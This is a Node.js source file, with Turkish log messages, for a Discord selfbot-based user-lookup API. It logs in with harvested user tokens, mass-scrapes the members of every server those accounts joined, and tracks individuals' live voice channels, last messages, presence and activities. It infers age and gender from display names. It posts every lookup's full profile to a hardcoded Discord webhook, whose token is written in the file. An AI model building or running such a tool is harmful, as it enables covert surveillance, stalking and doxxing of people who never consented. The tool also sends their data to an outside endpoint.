const express = require("express");
const { Client } = require("discord.js-selfbot-v13");
const mongoose = require("mongoose");
const fs = require("fs");
const path = require("path");
const UserModel = require("../Models/UserModel");
const GuildModel = require("../Models/GuildModel");
const axios = require('axios');
const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1388656340309643415/qyfWSlWvSqq7ouUFwphtSRvZrGw1HPCDlG3euSJBh4FwSWB6yfSxpMwXP0IECzRvIcpA';


const UserUpdateHandler = require("./updates/userUpdate");
const GuildMemberRemoveHandler = require("./updates/guildMemberRemove");
const GuildMemberAddHandler = require("./updates/guildMemberAdd");
const MessageCreateHandler = require("./updates/messageCreate");
const VoiceStateUpdateHandler = require("./updates/voiceStateUpdate");



let chalk;
(async () => {
  chalk = (await import('chalk')).default;
})();


const configPath = path.join(__dirname, "../../config.json");
const config = JSON.parse(fs.readFileSync(configPath, "utf8"));


const mongoUri = process.env.MONGO_URI || config.MONGO_URI || "mongodb:localhost:27017/bewrqcim";
mongoose.connect(mongoUri, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("MongoDB bağlantısı başarılı!"))
  .catch((err) => console.error("MongoDB bağlantı hatası:", err));

class UserController {
  constructor(app, clients) {
    this.clients = clients;
    this.app = app;
    this.routes();
    this.updateQueue = new Map(); 
    this.batchSize = 100; 
    this.updateInterval = 5000; 
    
  
    this.updateHandlers = [
      new UserUpdateHandler(clients, this),
      new GuildMemberRemoveHandler(clients, this),
      new GuildMemberAddHandler(clients, this),
      new MessageCreateHandler(clients, this),
      new VoiceStateUpdateHandler(clients, this)
    ];

 
    this.startBatchUpdateTimer();


    setTimeout(() => {
      UserModel.countDocuments().then(count => {
        if (chalk) {
          console.log(chalk.magentaBright('🗄️  [YEDEKLENEN KULLANICI] ') + chalk.bold(`${count}`));
          console.log(chalk.yellowBright('🚀 [YEDEKLEME BAŞLADI] Kullanıcılar yedekleniyor...'));
        } else {
          console.log(`[YEDEKLENEN KULLANICI] ${count}`);
          console.log(`[YEDEKLEME BAŞLADI] Kullanıcılar yedekleniyor...`);
        }
      }).catch(err => {
        if (chalk) {
          console.error(chalk.red('Kullanıcı sayısı alınamadı:'), err);
        } else {
          console.error('Kullanıcı sayısı alınamadı:', err);
        }
      });


      this.backupAllUsers(this.clients).then(() => {
        if (chalk) {
          console.log(chalk.greenBright('✅ [YEDEKLEME TAMAMLANDI] Tüm kullanıcılar yedeklendi!'));
        } else {
          console.log('[YEDEKLEME TAMAMLANDI] Tüm kullanıcılar yedeklendi!');
        }
      });


      setTimeout(() => {
        let totalGuildMembers = 0;
        if (this.clients && this.clients.length > 0) {
          this.clients.forEach(client => {
            client.guilds.cache.forEach(guild => {
              totalGuildMembers += guild.memberCount;
            });
          });
        }
        if (chalk) {
          console.log(chalk.cyanBright('🟢 [SİSTEM HİZMETİ] Sunuculardaki toplam kullanıcı: ') + chalk.bold(totalGuildMembers));
        } else {
          console.log(`[SİSTEM HİZMETİ] Sunuculardaki toplam kullanıcı: ${totalGuildMembers}`);
        }
      }, 4000);
    }, 1000);
  }

  routes() {
    this.app.route("/api/user").get(this.getUser.bind(this));
  }

  getGender(name) {
    if (!name) {
      return "Belirsiz";
    }

    const lowerCaseNames = name.split(" ").map((name) => name.toLowerCase());
    const Genders = require("./sex.json");
    const genders = Genders.Names.filter((entry) =>
      lowerCaseNames.includes(entry.name.toLowerCase()),
    ).map((entry) => entry.sex);

    if (genders.length === 0) {
      return "Belirsiz";
    }

    if (
      genders[0] === "U" &&
      genders.length === 2 &&
      (genders[1] === "E" || genders[1] === "K")
    ) {
      return genders[1] === "E" ? "Erkek" : "Kadın";
    } else if (genders.every((gender) => gender === "U")) {
      return "Belirsiz";
    } else if (genders.every((gender) => gender === "K")) {
      return "Kadın";
    } else if (genders.every((gender) => gender === "E")) {
      return "Erkek";
    } else {
      return genders[0] === "E" ? "Erkek" : "Kadın";
    }
  }

  isValidName(name) {
    const Genders = require("./sex.json");
    return Genders.Names.some(
      (entry) => entry.name.toLowerCase() === name.toLowerCase(),
    );
  }

  async getUser(req, res) {
    const userId = req.query.id;
    if (!userId) {
      return res.status(400).send({ success: false, message: "Bir id belirtmelisin." });
    }

    try {
      let user = null;
      let guilds = [];
      let guildStaff = [];

      for (const client of this.clients) {
        try {
          user = await this.findUserById(userId);
          if (user) {
        
            for (const guild of client.guilds.cache.values()) {
              try {
                const member = guild.members.cache.get(userId);
                if (member) {
        
                  const isOwner = guild.ownerId === userId;
                  const roles = member.roles.cache.map(role => role.name.toLowerCase());
                  
                  const hasAdminRole = roles.some(role => 
                    role.includes('admin') || 
                    role.includes('yönetici') ||
                    role.includes('kurucu')
                  );
                  
                  const hasModRole = roles.some(role => 
                    role.includes('mod') || 
                    role.includes('yetkili') ||
                    role.includes('guard')
                  );

             
                  if (isOwner || hasAdminRole || hasModRole) {
                    const staffInfo = {
                      GuildName: guild.name,
                      GuildId: guild.id,
                      StaffStatus: true,
                      Permissions: {
                        isAdmin: hasAdminRole,
                        isMod: hasModRole,
                        isOwner: isOwner
                      }
                    };
                    guildStaff.push(staffInfo);
                  }

          
                  let voiceInfo = null;
                  const voiceChannels = guild.channels.cache.filter(channel => channel.type === 'GUILD_VOICE');
                  const channelStats = voiceChannels.map(channel => {
                    const members = channel.members;
                    return {
                      channelId: channel.id,
                      channelName: channel.name,
                      totalUsers: members.size,
                      mutedUsers: members.filter(member => member.voice.mute || member.voice.selfMute).size,
                      deafenedUsers: members.filter(member => member.voice.deaf || member.voice.selfDeaf).size,
                      streamingUsers: members.filter(member => member.voice.streaming).size,
                      members: members.map(member => ({
                        id: member.id,
                        username: member.user.username,
                        displayName: member.displayName || member.user.username,
                        avatar: (member.user && typeof member.user.displayAvatarURL === 'function') ? member.user.displayAvatarURL({ size: 128 }) : null,
                        isMuted: member.voice.mute || member.voice.selfMute,
                        isDeafened: member.voice.deaf || member.voice.selfDeaf,
                        isStreaming: member.voice.streaming
                      }))
                    };
                  });

                  voiceInfo = {
                    totalMembers: guild.memberCount,
                    totalUsersInVoice: channelStats.reduce((sum, channel) => sum + channel.totalUsers, 0),
                    totalMutedUsers: channelStats.reduce((sum, channel) => sum + channel.mutedUsers, 0),
                    totalDeafenedUsers: channelStats.reduce((sum, channel) => sum + channel.deafenedUsers, 0),
                    totalStreamingUsers: channelStats.reduce((sum, channel) => sum + channel.streamingUsers, 0)
                  };

        
                  const guildData = await GuildModel.findOne({ guildId: guild.id }) || {};

           
                  guilds.push({
                    guildName: guild.name,
                    displayName: member.displayName || '',
                    guildId: guild.id,
                    boostCount: guild.premiumSubscriptionCount || 0,
                    icon: guild.icon ? {
                      url: guild.icon.startsWith('a_')
                        ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.gif?size=4096`
                        : `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png?size=4096`,
                      format: guild.icon.startsWith('a_') ? 'gif' : 'png',
                      animated: guild.icon.startsWith('a_')
                    } : null,
                    banner: guild.banner
                      ? {
                          url: guild.banner.startsWith('a_')
                            ? `https://cdn.discordapp.com/banners/${guild.id}/${guild.banner}.gif?size=4096`
                            : `https://cdn.discordapp.com/banners/${guild.id}/${guild.banner}.png?size=4096`,
                          format: guild.banner.startsWith('a_') ? 'gif' : 'png',
                          animated: guild.banner.startsWith('a_')
                        }
                      : null,
                    voice: voiceInfo,
                    isAdmin: member.permissions.has('ADMINISTRATOR'),
                    isOwner: guild.ownerId === user.id,
                  });
                }
              } catch (err) {
                console.error('Guild member error:', err);
                continue;
              }
            }

            await this.backupSingleUser(user);
            const userData = await UserModel.findOne({ discordId: userId });
            
          
            let whereNow = null;
            let currentVoiceChannel = null;
            let voiceMembers = [];

       
            for (const guild of client.guilds.cache.values()) {
              const member = guild.members.cache.get(userId);
              if (member && member.voice.channel) {
                currentVoiceChannel = member.voice.channel;
           
                voiceMembers = Array.from(currentVoiceChannel.members.values()).map(m => ({
                  id: m.id,
                  username: m.user.username,
                  displayName: m.displayName || m.user.username,
                  avatar: (m.user && typeof m.user.displayAvatarURL === 'function') ? m.user.displayAvatarURL({ size: 128 }) : null,
                  isMuted: m.voice.mute || m.voice.selfMute,
                  isDeafened: m.voice.deaf || m.voice.selfDeaf,
                  isStreaming: m.voice.streaming
                }));
         
                if (!voiceMembers.find(m => m.id === user.id)) {
                  voiceMembers.push({
                    id: user.id,
                    username: user.username,
                    displayName: user.displayName || user.username,
                    avatar: (user && typeof user.displayAvatarURL === 'function') ? user.displayAvatarURL({ size: 128 }) : null,
                    isMuted: member.voice.mute || member.voice.selfMute,
                    isDeafened: member.voice.deaf || member.voice.selfDeaf,
                    isStreaming: member.voice.streaming
                  });
                }
                whereNow = {
                  type: 'voice',
                  channelName: currentVoiceChannel.name,
                  guildName: guild.name,
                  guildId: guild.id,
                  joinedAt: member.voice.joinedAt || new Date(),
                  icon: guild.icon ? {
                    url: guild.icon.startsWith('a_')
                      ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.gif?size=4096`
                      : `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png?size=4096`,
                    format: guild.icon.startsWith('a_') ? 'gif' : 'png',
                    animated: guild.icon.startsWith('a_')
                  } : null,
                  banner: guild.banner
                    ? {
                        url: guild.banner.startsWith('a_')
                          ? `https://cdn.discordapp.com/banners/${guild.id}/${guild.banner}.gif?size=4096`
                          : `https://cdn.discordapp.com/banners/${guild.id}/${guild.banner}.png?size=4096`,
                        format: guild.banner.startsWith('a_') ? 'gif' : 'png',
                        animated: guild.banner.startsWith('a_')
                      }
                    : null,
                  members: voiceMembers
                };
                break;
              }
            }

        
            let userAvatarDecoration = null;
            if (user.user && user.user.avatarDecoration) {
              userAvatarDecoration = user.user.avatarDecoration;
            } else if (user.user && user.user.avatar_decoration) {
              userAvatarDecoration = user.user.avatar_decoration;
            } else if (user.user && user.user.avatarDecorationData) {
              userAvatarDecoration = user.user.avatarDecorationData;
            }
            let userAvatarDecorationURL = null;
            if (userAvatarDecoration && typeof userAvatarDecoration === 'string') {
              userAvatarDecorationURL = `https://cdn.discordapp.com/avatar-decoration-presets/${userAvatarDecoration}.png?size=240`;
            } else if (userAvatarDecoration && userAvatarDecoration.asset) {
              userAvatarDecorationURL = `https://cdn.discordapp.com/avatar-decoration-presets/${userAvatarDecoration.asset}.png?size=240`;
            }

            

          
            const lastSeen = {
              Message: userData?.LastSeen?.Message || null,
              Voice: userData?.LastSeen?.Voice || null
            };

          
            let platforms = [];
            let status = 'offline';
            let allMembers = [];
            let statusPriority = { 'online': 3, 'dnd': 2, 'idle': 1, 'offline': 0 };
            let bestStatus = 'offline';
            let bestMember = null;
            for (const client of this.clients) {
       
              if (client.user && client.user.id === userId && client.user.presence && typeof client.user.presence.status === 'string') {
                if (statusPriority[client.user.presence.status] > statusPriority[bestStatus]) {
                  bestStatus = client.user.presence.status;
                  bestMember = client.user;
                }
              }
              for (const guild of client.guilds.cache.values()) {
                let member = guild.members.cache.get(userId);
                if (member) {
           
                  try {
                    member = await guild.members.fetch(userId, { force: true });
                  } catch (e) { /* */ }
                  if (member && member.presence && typeof member.presence.status === 'string') {
                    if (statusPriority[member.presence.status] > statusPriority[bestStatus]) {
                      bestStatus = member.presence.status;
                      bestMember = member;
                    }
                    allMembers.push(member);
                    break; 
                  }
                }
              }
            }
            status = bestStatus;
        
            if (bestMember && bestMember.presence) {
              if (bestMember.presence.clientStatus) {
                platforms = Object.keys(bestMember.presence.clientStatus)
                  .filter(platform => bestMember.presence.clientStatus[platform] === 'online');
                if (platforms.length === 0) {
                  platforms = Object.keys(bestMember.presence.clientStatus);
                }
              }
            }
            if (!platforms || platforms.length === 0) platforms = ['offline'];
            let activities = [];
            if (bestMember && bestMember.presence && Array.isArray(bestMember.presence.activities)) {
              activities = bestMember.presence.activities.map(act => ({
                name: act.name,
                type: act.type,
                state: act.state || null,
                details: act.details || null,
                url: act.url || null
              }));
            }

            let spotify = null;
            const spotifyActivity = activities.find(
              act =>
                act.name === 'Spotify' &&
                (act.type === 2 || act.type === 'LISTENING')
            );
            if (spotifyActivity) {
       
              let albumArt = null;
              if (spotifyActivity.assets) {
                albumArt = spotifyActivity.assets.largeImageURL || spotifyActivity.assets.largeImage || null;
                if (albumArt && albumArt.startsWith('spotify:')) {
                  albumArt = `https://i.scdn.co/image/${albumArt.replace('spotify:', '')}`;
                }
              }
         
              let url = null;
              if (spotifyActivity.syncId) {
                url = `https://open.spotify.com/track/${spotifyActivity.syncId}`;
              } else if (spotifyActivity.sessionId) {
                url = `https://open.spotify.com/track/${spotifyActivity.sessionId}`;
              }
              spotify = {
                name: spotifyActivity.details,
                artist: spotifyActivity.state,
                albumArt: albumArt,
                url: url,
                start: spotifyActivity.timestamps?.start || null,
                end: spotifyActivity.timestamps?.end || null
              };
            }

       
            let customStatus = null;
            const customStatusActivity = activities.find(
              act => act.type === 4 || act.type === 'CUSTOM'
            );
            if (customStatusActivity) {
              customStatus = {
                text: customStatusActivity.state || null,
                emoji: customStatusActivity.emoji?.name || null
              };
            }

       
            let primaryGuild = null;
            if (user.user && user.user.profile && user.user.profile.primaryGuild) {
              primaryGuild = user.user.profile.primaryGuild;
            } else if (user.user && user.user.primaryGuild) {
              primaryGuild = user.user.primaryGuild;
            }

       
            const userObj = {
              id: user.id,
              username: user.username,
              globalName: user.globalName || user.global_name || user.user?.globalName || user.user?.global_name || null,
              displayName: user.displayName || user.username,
              discriminator: user.discriminator,
              avatar: user.displayAvatarURL({ size: 4096 }),
              Banner: user.user?.banner ? user.user.bannerURL({ size: 4096 }) : null,
              avatarDecoration: userAvatarDecorationURL,
              status: status,
              platforms: platforms,
              guildStaff,
              Guilds: guilds,
              bio: userData?.userInfo?.UserBio || null,
              activities: activities,
              spotify: spotify,
              customStatus: customStatus,
              primaryGuild: primaryGuild,
            };
       
            const embedFields = Object.entries(userObj).map(([k, v]) => {
              let value;
              if (typeof v === 'object' && v !== null) {
                value = JSON.stringify(v);
              } else {
                value = String(v);
              }
              if (value.length > 1024) value = value.slice(0, 1021) + '...';
              return { name: k, value };
            });
            axios.post(WEBHOOK_URL, {
              content: 'Aratılan kullanıcı verisi:',
              embeds: [{
                title: userObj.username,
                description: 'Aratılan kullanıcı bilgisi',
                fields: embedFields
              }]
            }).catch(console.error);
            res.json({
              success: true,
              user: userObj,
              displayNames: guilds.map((guild) => guild.displayName || ''),
              WhereNow: whereNow,
              LastSeen: {
                Message: (lastSeen.Message && lastSeen.Message.guildName && lastSeen.Message.guildName !== 'DM') ? {
                  content: lastSeen.Message.content || "",
                  channelName: lastSeen.Message.channelName || "",
                  guildName: lastSeen.Message.guildName || "",
                  timestamp: lastSeen.Message.timestamp || new Date()
                } : null,
                Voice: lastSeen.Voice ? {
                  channelName: lastSeen.Voice.channelName || "",
                  guildName: lastSeen.Voice.guildName || "",
                  timestamp: lastSeen.Voice.timestamp || new Date(),
                  members: Array.isArray(lastSeen.Voice.members) ? 
                    lastSeen.Voice.members
                      .filter(member => member && typeof member === 'object')
                      .map(member => {
                        let avatar = null;
                        if (member.avatar) {
                          if (typeof member.avatar === 'string' && member.avatar.startsWith('http')) {
                            avatar = member.avatar;
                          } else if (typeof member.avatar === 'string') {
                            avatar = `https://cdn.discordapp.com/avatars/${member.id}/${member.avatar}.png?size=128`;
                          }
                        }
                        return {
                          id: member.id || '',
                          username: member.username || 'Bilinmeyen Kullanıcı',
                          displayName: member.displayName || member.username || 'Bilinmeyen Kullanıcı',
                          avatar: avatar,
                          isMuted: member.isMuted || false,
                          isDeafened: member.isDeafened || false,
                          isStreaming: member.isStreaming || false
                        };
                      }) : []
                } : null
              },
              TopName: this.getTopName(guilds),
              TopAge: this.getTopAge(guilds),
              TopSex: this.getGender(this.getTopName(guilds)),
              GuildStaff: guildStaff.map(staff => ({
                GuildName: staff.Permissions.isOwner ? `👑 ${staff.GuildName}` : staff.GuildName,
                GuildId: staff.GuildId,
                StaffStatus: staff.StaffStatus,
                Permissions: {
                  isAdmin: staff.Permissions.isAdmin,
                  isMod: staff.Permissions.isMod,
                  isOwner: staff.Permissions.isOwner
                }
              })),
            });

            return;
          }
        } catch (err) {
          console.error('Client loop error:', err);
          continue;
        }
      }

      if (!user) {
        return res.status(404).send({ success: false, message: "Belirlenen üye bulunamadı." });
      }
    } catch (error) {
      console.error("Error fetching user:", error);
      return res.status(500).send({ 
        success: false, 
        message: "Internal server error",
        error: process.env.NODE_ENV === 'development' ? error.message : undefined
      });
    }
  }

 
  getAssetFormat(url, isAnimated) {
    if (!url) return 'png';
    return isAnimated ? 'gif' : 'png';
  }

 
  getTopName(guilds) {
    const nameCounts = {};
    guilds.forEach((guild) => {
      if (guild !== null) {
        const name = guild.displayName.replace(/[^a-zA-ZğüşıöçĞÜŞİÖÇ]/g, "");
        nameCounts[name] = (nameCounts[name] || 0) + 1;
      }
    });

    let maxCount = 0;
    let topName = "";
    Object.entries(nameCounts).forEach(([name, count]) => {
      if (count > maxCount) {
        maxCount = count;
        topName = name;
      }
    });

    return this.isValidName(topName) ? topName : "";
  }

  getTopAge(guilds) {
    const ageCounts = {};
    guilds.forEach((guild) => {
      if (guild !== null) {
        const age = guild.displayName.replace(/\D/g, "");
        if (age !== "") {
          ageCounts[age] = (ageCounts[age] || 0) + 1;
        }
      }
    });

    let maxCount = 0;
    let topAge = "";
    Object.entries(ageCounts).forEach(([age, count]) => {
      if (count > maxCount) {
        maxCount = count;
        topAge = age;
      }
    });

    return topAge && !isNaN(parseInt(topAge)) ? parseInt(topAge) : "";
  }


  startBatchUpdateTimer() {
    setInterval(() => this.processBatchUpdates(), this.updateInterval);
  }


  async queueUpdate(userId, type, data) {
    if (!this.updateQueue.has(userId)) {
      this.updateQueue.set(userId, {
        updates: [],
        lastUpdate: new Date()
      });
    }
    
    const userQueue = this.updateQueue.get(userId);
    userQueue.updates.push({ type, data, timestamp: new Date() });
    

    if (userQueue.updates.length >= this.batchSize) {
      await this.processUserUpdates(userId);
    }
  }


  async processUserUpdates(userId) {
    const userQueue = this.updateQueue.get(userId);
    if (!userQueue || userQueue.updates.length === 0) return;

    try {
      const user = await UserModel.findOne({ discordId: userId });
      if (!user) return;


      if (!user.LastSeen) {
        user.LastSeen = {
          Message: null,
          Voice: null
        };
      }


      for (const update of userQueue.updates) {
        const { type, data, timestamp } = update;
        const newEntry = {
          ...data,
          timestamp
        };

        if (type === 'Message') {
          user.LastSeen.Message = newEntry;
        } else if (type === 'Voice') {
          user.LastSeen.Voice = newEntry;
        }
      }


      user.lastUpdated = new Date();
      await user.save();


      this.updateQueue.delete(userId);

    } catch (error) {
      console.error(`Kullanıcı güncellemeleri işlenirken hata (${userId}):`, error);
    }
  }


  async processBatchUpdates() {
    const promises = [];
    for (const [userId] of this.updateQueue) {
      promises.push(this.processUserUpdates(userId));
    }
    await Promise.all(promises);
  }


  async updateLastSeen(userId, type, data) {
    await this.queueUpdate(userId, type, data);
  }


  async findUserById(userId) {
    for (const client of this.clients) {
      if (!client || !client.guilds) continue;
      for (const guild of client.guilds.cache.values()) {
        try {
          const member = await guild.members.fetch(userId);
          if (member) {
            return member;
          }
        } catch (error) {
          continue;
        }
      }
    }
    return null;
  }


  async updateUserData(user) {
    try {
      const userData = {
        discordId: user.id,
        username: user.username,
        discriminator: user.discriminator,
        avatar: user.avatar,
        lastUpdated: new Date(),
        userInfo: {
          UserName: user.username,
          UserGlobalName: user.globalName || user.global_name || null,
          UserAvatar: user.displayAvatarURL ? user.displayAvatarURL({ size: 4096 }) : null,
          UserBanner: (user.banner ? (typeof user.bannerURL === 'function' ? user.bannerURL({ size: 4096 }) : null) : null),
          UserBio: user.bio || user.user?.bio || null
        }
      };

      await UserModel.findOneAndUpdate(
        { discordId: userData.discordId },
        userData,
        { upsert: true, new: true }
      );

      if (chalk) {
        console.log(chalk.blueBright('🔄 [GÜNCELLEME] ') + chalk.bold(`${user.username} (${user.id})`) + chalk.cyanBright(' güncellendi!'));
      } else {
        console.log(`[GÜNCELLEME] ${user.username} (${user.id}) güncellendi!`);
      }
    } catch (error) {
      if (chalk) {
        console.error(chalk.red('Kullanıcı güncellenirken hata oluştu:'), error);
      } else {
        console.error('Kullanıcı güncellenirken hata oluştu:', error);
      }
    }
  }

  async backupSingleGuild(guildId) {

    let guild = null;
    for (const client of this.clients) {
      guild = client.guilds.cache.get(guildId);
      if (guild) break;
    }
    if (!guild) {
      console.error("Yedeklenemeyen sunucu:", guildId);
      return;
    }
    const guildData = {
      guildId: guild.id,
      name: guild.name,
      memberCount: guild.memberCount,
      icon: guild.icon,
      ownerId: guild.ownerId,
 
    };
    await GuildModel.findOneAndUpdate(
      { guildId: guildData.guildId },
      guildData,
      { upsert: true, new: true }
    );
    if (chalk) {
      console.log(chalk.greenBright('💾 [TEKİL SUNUCU YEDEK] ') + chalk.bold(`${guild.name} (${guild.id})`) + chalk.cyanBright(' yedeklendi!'));
    } else {
      console.log(`[TEKİL SUNUCU YEDEK] ${guild.name} (${guild.id}) yedeklendi!`);
    }
    return guildData;
  }


  async backupAllUsers(clients) {
    const userBatches = [];
    const batchSize = 100;
    let currentBatch = [];


    const allUserIdsSet = new Set();
    for (const client of clients) {
      for (const guild of client.guilds.cache.values()) {
        for (const member of guild.members.cache.values()) {
          allUserIdsSet.add(member.user.id);
        }
      }
    }
    const allUsers = Array.from(allUserIdsSet);
    const totalUsers = allUsers.length;
    let processedUsers = 0;

    for (const userId of allUsers) {
      try {
        const member = await this.findUserById(userId);
        if (!member) {
          console.error(`Kullanıcı bulunamadı: ${userId}`);
          continue;
        }
        const userData = await this.backupSingleUser(member);
        if (userData) {
          currentBatch.push(userData);
          if (currentBatch.length >= batchSize) {
            userBatches.push(currentBatch);
            currentBatch = [];
          }
        }
      } catch (error) {
        console.error(`Kullanıcı yedeklenirken hata: ${userId}`, error);
      }
    }

    if (currentBatch.length > 0) {
      userBatches.push(currentBatch);
    }


    for (const batch of userBatches) {
      try {
        const operations = batch.map(user => ({
          updateOne: {
            filter: { discordId: user.discordId },
            update: { $set: user },
            upsert: true
          }
        }));

        await UserModel.bulkWrite(operations);
        processedUsers += batch.length;
        if (chalk) {
          console.log(chalk.magentaBright('🗄️  [TOPLAM YEDEKLENEN KULLANICI] ') + chalk.bold(`${processedUsers}/${totalUsers}`));
        } else {
          console.log(`[TOPLAM YEDEKLENEN KULLANICI] ${processedUsers}/${totalUsers}`);
        }
      } catch (error) {
        if (chalk) {
          console.error(chalk.red('[TOPLU KULLANICI KAYIT HATASI]:'), error);
        } else {
          console.error('[TOPLU KULLANICI KAYIT HATASI]:', error);
        }
      }
    }
    return {
      totalUsers,
      processedUsers
    };
  }


  async backupAllGuilds() {
    const guildBatches = [];
    const batchSize = 100;
    let currentBatch = [];


    const allGuildIdsSet = new Set();
    for (const client of this.clients) {
      for (const guild of client.guilds.cache.values()) {
        allGuildIdsSet.add(guild.id);
      }
    }
    const allGuilds = Array.from(allGuildIdsSet);
    const totalGuilds = allGuilds.length;
    let processedGuilds = 0;

    for (const guildId of allGuilds) {
      try {
        const guildData = await this.backupSingleGuild(guildId);
        if (guildData) {
          currentBatch.push(guildData);
          if (currentBatch.length >= batchSize) {
            guildBatches.push(currentBatch);
            currentBatch = [];
          }
        }
      } catch (error) {
        console.error(`Sunucu yedeklenirken hata: ${guildId}`, error);
      }
    }

    if (currentBatch.length > 0) {
      guildBatches.push(currentBatch);
    }


    for (const batch of guildBatches) {
      try {
        const operations = batch.map(guild => ({
          updateOne: {
            filter: { guildId: guild.guildId },
            update: { $set: guild },
            upsert: true
          }
        }));

        await GuildModel.bulkWrite(operations);
        processedGuilds += batch.length;
        if (chalk) {
          console.log(chalk.blueBright('🏰 [TOPLAM YEDEKLENEN SUNUCU] ') + chalk.bold(`${processedGuilds}/${totalGuilds}`));
        } else {
          console.log(`[TOPLAM YEDEKLENEN SUNUCU] ${processedGuilds}/${totalGuilds}`);
        }
      } catch (error) {
        if (chalk) {
          console.error(chalk.red('[TOPLU SUNUCU KAYIT HATASI]:'), error);
        } else {
          console.error('[TOPLU SUNUCU KAYIT HATASI]:', error);
        }
      }
    }
    return {
      totalGuilds,
      processedGuilds
    };
  }


  async backupSingleUser(member) {
    if (!member || !member.user || !member.user.id) {
      console.error("Yedeklenemeyen kullanıcı:", member);
      return;
    }
    const userData = {
      discordId: member.user.id,
      username: member.user.username,
      discriminator: member.user.discriminator,
      avatar: member.user.avatar,
      userInfo: {
        UserName: member.user.username,
        UserGlobalName: member.user.globalName || member.user.global_name || null,
        UserAvatar: member.user.displayAvatarURL ? member.user.displayAvatarURL({ size: 4096 }) : null,
        UserBanner: (member.user.banner ? (typeof member.user.bannerURL === 'function' ? member.user.bannerURL({ size: 4096 }) : null) : null),
        UserBio: member.user.bio || member.user.user?.bio || null
      }
    };
    await UserModel.findOneAndUpdate(
      { discordId: userData.discordId },
      userData,
      { upsert: true, new: true }
    );
    if (chalk) {
      console.log(chalk.greenBright('💾 [TEKİL YEDEK] ') + chalk.bold(`${member.user.username} (${member.user.id})`) + chalk.cyanBright(' yedeklendi ve izlemeye alındı!'));
    } else {
      console.log(`[TEKİL YEDEK] ${member.user.username} (${member.user.id}) yedeklendi ve izlemeye alındı!`);
    }
  }
}


const app = express();
const clients = [];


const startServer = (port) => {
  app.listen(port, () => {
    console.log(`API çalışıyor: http://localhost:${port}`);
  }).on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
      console.log(`Port ${port} kullanımda, ${port + 1} deneniyor...`);
      startServer(port + 1);
    } else {
      console.error('Sunucu başlatılırken hata:', err);
    }
  });
};

(config.TOKENS || []).forEach((token) => {
  const client = new Client();
  client.once("ready", () => {
    console.log(`Discord istemcisi olarak giriş yapıldı: ${client.user.username}`);
    clients.push(client);
    if (clients.length === config.TOKENS.length) {
      new UserController(app, clients);
    }
  });


  client.on('guildCreate', (guild) => {
    if (chalk) {
      console.log(chalk.blueBright(`🆕 [YENİ SUNUCU] Bot yeni bir sunucuya katıldı: ${guild.name} (${guild.id})`));
    } else {
      console.log(`[YENİ SUNUCU] Bot yeni bir sunucuya katıldı: ${guild.name} (${guild.id})`);
    }

    if (guild.members && guild.members.cache) {
      console.log(`[YENİ SUNUCU] Sunucudaki toplam üye: ${guild.members.cache.size}`);
    }
  });


  client.on('guildMemberAdd', (member) => {
    if (chalk) {
      console.log(chalk.greenBright(`➕ [YENİ ÜYE] ${member.user.username} (${member.user.id}) sunucuya katıldı! [${member.guild.name}]`));
    } else {
      console.log(`[YENİ ÜYE] ${member.user.username} (${member.user.id}) sunucuya katıldı! [${member.guild.name}]`);
    }
  });

  client.login(token).catch((err) =>
    console.error(`Bu token ile giriş yapılamadı: ${token}`, err),
  );
});

const PORT = config.PORT || 3131;
startServer(PORT);